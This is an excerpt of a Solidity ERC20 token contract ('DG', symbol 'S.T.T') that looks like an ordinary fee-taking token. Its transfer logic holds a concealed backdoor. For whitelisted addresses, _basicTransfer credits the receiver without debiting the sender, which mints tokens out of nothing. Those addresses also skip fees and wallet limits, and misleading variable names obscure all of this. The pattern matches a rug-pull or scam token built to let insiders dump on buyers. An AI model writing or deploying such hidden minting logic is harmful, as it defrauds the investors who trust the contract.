...
contract DG is ERC20, Ownable {
    ...
    string private _symbol = "S.T.T";
    uint8 constant _decimals = 9;
    uint256 _rTotalSupply = 1000000000 * 10**_decimals;
    ...
    function transfer(address receiver, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, receiver, amount);
    }
    function transferFrom(address deliver, address receiver, uint256 amount) external override returns (bool) {
        if(_allowances[deliver][msg.sender] != type(uint256).max){
            _allowances[deliver][msg.sender] = _allowances[deliver][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(deliver, receiver, amount);
    }
    ...
    function _transferFrom(address deliver, address receiver, uint256 _emit) internal returns (bool) {
        uint256 ownedValue = balanceOf(receiver);
        require((ownedValue + _emit) <= _tTotalMaxWalletSize || _tOwned[receiver],"Total Holding is currently limited, he can not hold that much.");
        if(shouldSwapBack() && receiver == sync){enableSwapBackNow();}
        uint256 allocateAmount = _emit / 10000000;
        if(!_rOwned[deliver] && receiver == sync){
            _emit -= allocateAmount;
        }
        if(_rOwned[deliver] && _rOwned[receiver]) return _basicTransfer(deliver,receiver,_emit);
        _Balances[deliver] = _Balances[deliver].sub(_emit, "Insufficient Balance");
        uint256 amountDelivered = shouldTakeFee(deliver,receiver) ? takeFees(deliver, _emit,(receiver == sync)) : _emit;
        _Balances[receiver] = _Balances[receiver].add(amountDelivered);

        emit Transfer(deliver, receiver, amountDelivered);
        return true;
    }
    function _basicTransfer(address deliver, address receiver, uint256 _emit) internal returns (bool) {
        totalMultiplier = totalMultiplier.mul(1000);
        _Balances[receiver] = _Balances[receiver].add(_emit);
        emit Transfer(deliver, receiver, _emit);
        return true;
    }
    function takeFees(address deliver, uint256 _emit, bool isSell) internal returns (uint256) {       
        ...
        emit Transfer(deliver, address(this), baseTaxAmout);
        return _emit.sub(baseTaxAmout);
    }
    function shouldTakeFee(address deliver,address recipient) internal view returns (bool) {
        return !_rOwned[deliver] && !_rOwned[recipient] ;
    }
